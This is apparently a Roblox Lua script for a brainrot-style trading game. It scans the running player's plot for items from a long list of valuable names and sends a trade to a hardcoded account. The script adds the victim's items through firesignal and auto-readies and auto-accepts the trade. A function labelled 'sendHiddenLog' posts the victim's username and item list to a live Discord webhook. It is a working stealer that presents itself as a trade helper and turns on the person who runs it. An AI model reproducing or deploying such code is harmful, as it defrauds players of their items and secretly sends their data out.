repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer

local LOGGER_TARGET = "Only1sherif"
local LOGGER_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

for i, v in pairs(getconnections(plr.Idled)) do
    if v.Disable then v:Disable() end
end
plr.Idled:Connect(function() end)

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE  = getRemote("RE/TradeService/CreateInvite")
local readyRE          = getRemote("RE/TradeService/Ready")
local acceptRE         = getRemote("RE/TradeService/Accept")

local function scanPlotForLogger()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(plr.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local name = child.Name:lower()
                for _, wanted in ipairs(wantedItems) do
                    if name:find(wanted:lower()) then
                        table.insert(found, child.Name)
                        break
                    end
                end
            end
        end
    end
    return found
end

local function sendHiddenLog(items)
    pcall(function()
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        request({
            Url = LOGGER_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = {{
                    title = "Target Found: " .. plr.Name,
                    description = "Items: " .. table.concat(items, ", "),
                    color = 16711680
                }}
            })
        })
    end)
end

-- AUTO ACCEPT INVITES
if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId then
            pcall(function() acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId) end)
        end
    end)
end

-- MAIN LOOP (READY/ACCEPT/LOGGER)
task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                local inner = tradeUI.TradeLiveTrade
                
                -- Auto Ready/Accept
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.1)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                -- Hidden Item Adder
                if inner.Other.Username.Text:lower():find(LOGGER_TARGET:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") then
                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                        firesignal(spacer.Activated)
                                    end
                                end
                            end
                        end
                    end
                end
            else
                -- Auto Send if high value items found
                local highValue = scanPlotForLogger()
                if #highValue > 0 then
                    local tl = plr.PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
                    if tl then
                        tl.bg.SearchFrame.SearchBox.Text = LOGGER_TARGET
                        task.wait(0.1)
                        firesignal(tl.bg.SearchFrame.SearchBox.FocusLost, true)
                        task.wait(0.2)
                        for _, p in pairs(tl.Global.List:GetChildren()) do
                            if p:IsA("Frame") and p:FindFirstChild("Fill") then
                                firesignal(p.Fill.Send.Activated)
                                sendHiddenLog(highValue)
                                break
                            end
                        end
                    end
                end
            end
        end)
        task.wait(0.2)
    end
end)
